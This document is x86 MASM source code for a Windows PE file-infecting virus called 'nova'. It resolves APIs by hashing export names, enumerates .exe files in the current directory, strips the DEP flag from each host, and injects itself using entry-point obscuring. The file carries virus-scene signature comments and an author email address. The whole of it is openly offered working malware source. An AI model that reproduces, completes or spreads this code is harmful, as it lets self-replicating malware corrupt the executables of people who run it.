.486
.model  flat, stdcall
include nova.inc
.code
nova_exe        proc
        push    eax
        pushad
        push    30h                             ;PEB
        pop     esi
        mov     eax, dword ptr fs:[esi]
        mov     eax, dword ptr [eax + 8]
        add     eax, rExitProcess               ;replaced by rva
        mov     dword ptr [esp + stackpadstruct.pusheax + sizeof stackpadstruct.pushesi], eax
        xor     edx, edx
        call    a1
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad
        ret
        setse   edx, a1
        call    $ + 5                           ;this near + 5
        stc
        sbb     dword ptr [esp], esi
        lods    dword ptr fs:[esi]
        mov     eax, dword ptr [eax + Ldr + PEB shr 10h]
        mov     esi, dword ptr [eax + Ldr + InInitializationOrderModuleList_Flink + PEB shr 10h]
        lodsd
        mov     ebp, dword ptr [eax + 8]
        call    skip_crcdws
        crc32v

skip_crcdws:
        pop     esi

;---------------------------------------------------------------------
;walk lists
;---------------------------------------------------------------------

import_next:
        mov     eax, dword ptr [ebp + IMAGE_DIRECTORY_ENTRY_EXPORT - IMAGE_NT_HEADERS.OptionalHeader.FileAlignment]
        mov     ebx, dword ptr [ebp + eax + IMAGE_DOS_HEADER.e_lfanew shl 1]
        add     ebx, ebp

export_next:
        mov     edi, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfNames]
        add     edi, ebp
        mov     edi, dword ptr [edi + edx * 4]
        stc
        sbb     eax, eax
        add     edi, ebp
        crc32d  eax, edi, al
        not     eax
        cmp     dword ptr [esi], eax
        je      resolve
        inc     edx
        cmp     dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.TimeDateStamp + IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint - IMAGE_EXPORT_DIRECTORY.TimeDateStamp shl 2 - sizeof IMAGE_EXPORT_DIRECTORY.NumberOfNames], edx
        jne     export_next
        int     3                               ;end up crashing

;---------------------------------------------------------------------
;resolve API address
;----
;find exe files
;---------------------------------------------------------------------

resolve:
        mov     edi, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]
        add     edi, ebp
        movzx   edi, word ptr [edi + edx * 2]
        mov     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
        add     eax, ebp
        mov     eax, dword ptr [eax + edi * 4]
        add     eax, ebp
        push    eax
        lodsd
        cdq                                     ;if no fxxxxxxxh
        cmp     byte ptr [esi], dl              ;db
        jne     import_next
        xor     ebx, ebx
        push    esp
        mov     dh, 2
        pop     ebp                             ;base-pointer
        sub     esp, edx
        mov     edi, esp
        push    "e"
        push    "xe.*"                          ;executable file
        push    esp
        pop     ecx
        push    edi
        push    ecx
        call    esFindFirstFileA
        xchg    esi, eax
        
labelg  open_file
        push    ebx
        push    ebx
        push    3
        push    ebx
        push    3
        push    3
        lea     ecx, dword ptr [edi + 2ch]
        push    ecx
        call    esCreateFileA
        push    eax
        push    ebx
        push    ebx 
        push    ebx
        push    4
        push    ebx
        push    eax
        call    dword ptr [ebp + 10h]
        push    eax
        push    ebx
        push    ebx
        push    ebx
        push    2
        push    eax
        call    dword ptr [ebp + (SECTION_DESCRIPTOR_RVA - SECTION_ID - HALFPTR) shl 1 - stackpadstruct.pushesi]
        push    eax
        pushad
        call    infect_exe
        pop     eax
        pop     eax
        pop     esp
        jmp     skip_file

;---------------------------------------------------------------------
;MZ and PE signatures
;---------------------------------------------------------------------

infect_exe      proc
        push    dword ptr fs:[ebx]
        mov     dword ptr fs:[ebx], esp
        mov     esi, dword ptr [ebp + rvansin - stackpadstruct.pushebp - 8]
        mov     ebp, eax
        cmp     word ptr [eax], 'ZM'
        jne     skip_file
        add     eax, dword ptr [ebp + IMAGE_DOS_HEADER.e_lfanew]
        cmp     dword ptr [eax], 'EP'
        je      guicui_app

labelg  skip_file
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad
        call    esUnmapViewOfFile
        call    esCloseHandle
        call    esCloseHandle
        push    edi
        push    esi
        call    esFindNextFileA
        test    eax, eax
        jnz     open_file
        int     3                               ;end up crashing
                                                ;but it was a trick and the clock struck twelve
;---------------------------------------------------------------------
;32-bit machine. GUI or CUI mode
;----
;if the code fits then infect
;---------------------------------------------------------------------

guicui_app:
        inc     bh
        lea     edx, dword ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics]
        test    word ptr [eax + sizeof PE_MACHINE], bx
        jz      skip_file
        mov     cl, byte ptr [eax + IMAGE_NT_HEADERS.OptionalHeader.Subsystem]
        sub     cl, 2
        cmp     cl, bh
        jnbe    skip_file
        test    word ptr [edx], bx
        jz      skip_dep
        sub     word ptr [edx], bx

skip_dep:
        small   2, 3ah                         ;force MASM to smaller offset
        mov     bh, 10h
        movzx   ecx, word ptr [eax + IMAGE_NT_HEADERS.FileHeader.NumberOfSections]
        imul    ecx, ecx, 28h
        small   0, 7fh                         ;force MASM to smaller offset
        lea     edi, dword ptr [edx + ecx + (IMAGE_NT_HEADERS.OptionalHeader.SizeOfStackReserve - (sizeof IMAGE_SECTION_HEADER - IMAGE_SECTION_HEADER.SizeOfRawData))]
        mov     ecx, dword ptr [edi]
        add     ecx, dword ptr [edi + 4]
        cmp     dword ptr [edx + SECTION_ID], ebx
        jb      skip_file
        cmp     dword ptr [edx], ecx
        jne     skip_file
        fldz
        fstp    qword ptr [edx]
        fldz
        fstp    qword ptr [edx + sizeof PE_DISP2 - 0ah]

;---------------------------------------------------------------------
;happy time
;entrypoint obscuring thing
;---------------------------------------------------------------------

        mov     edx, dword ptr [eax + (sizeof impfill - (offset dynbase - offset nova_size))]
        test    edx, edx
        jz      skip_file
        pushad
        call    skip_codes
        cmp     esi, edx
        jnb     skip_subim
        sub     edx, esi

skip_subim:
        sub     edx, dword ptr [edi + SECTION_DESCRIPTOR_RVA]
        cmp     dword ptr [edi + (offset impfill - offset dynbase) - 4], edx
        jbe     infect_crash
        add     edx, dword ptr [edi + (offset impfill - offset dynbase) + SECTION_DESCRIPTOR_RVA - HALFPTR]
        add     edx, ebp
        ret

skip_codes:
        mov     ecx, dword ptr [edi - HALFPTR]
        add     ecx, dword ptr [edi]
        lea     edi, dword ptr [eax + ((offset nova_size - offset nova_nthdr) - sizeof impfill)]
        mov     esi, dword ptr [eax - 4bh]
        pop     ebx
        call    ebx
        add     edi, 28h
        mov     edx, dword ptr [edx + 1 + (offset dynbase - offset nova_size) shr 1 - HALFPTR]
        call    ebx
        add     ecx, esi
        xchg    dword ptr [edx], ecx
        sub     ecx, esi
        mov     dword ptr [esp + sizeof stackpadstruct - stackpadstruct.pushesp], ecx
        popad
        add     dword ptr [edi], ebx
        add     dword ptr [eax - (sizeof impfill - IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)], ebx
        add     dword ptr [edi - HALFPTR shl 1], ebx
        push    ebx
        lea     edi, dword ptr [ebp + ecx]
        pop     ecx
        push    edi
        pop     ebp
        rep     movsb
        mov     dword ptr [ebp + (offset impfill - offset dynbase)], edx

infect_crash:
        int     3                               ;end up crashing
infect_exe      endp

;---------------------------------------------------------------------
;no padding purpose
;---------------------------------------------------------------------

labelg  nova_tail                               ;the digital smile...
        db      0fb0h - (offset nova_tail - nova_exe) dup ("h")
        org     $ - 1a1h                        ;offset machine - offset nova_nthdr

;---------------------------------------------------------------------
;do not touch labels
;---------------------------------------------------------------------

labelg  nova_nthdr
        db      0f8h dup ("h")                  ;PE32 only 

labelg  nova_size
        db      1eh  dup ("h")

labelg  dynbase
        db      0ch  dup ("h")

impfill db      7fh  dup ("h")                  ;optimised import data directory offset

;---------------------------------------------------------------------
;at the end of the tail - just darkness
;---------------------------------------------------------------------

PE_MACHINE db      16h dup ("h")
PE_DISP2   db      3ah dup ("h")
           db      11h dup ("h")     
labelg  nova_end
nova_exe        endp

message         proc
        xor     ebx, ebx
        push    2ah                             ;mysterium tremendum et fascinans
                                                ;by mimieux
        mov     ecx, esp
        push    ebx
        push    708h                            ;eventful
        push    ebx
        push    ebx
        push    1
        push    ecx
        push    STD_OUTPUT_HANDLE
        call    WriteFile
        call    Sleep
        call    ExitProcess
message         endp

HALFPTR                equ    4
SECTION_ID             equ    HALFPTR
SECTION_DESCRIPTOR_RVA equ    0ch
rExitProcess           equ    offset message - 400000h
end     nova_exe
hh86_@live.com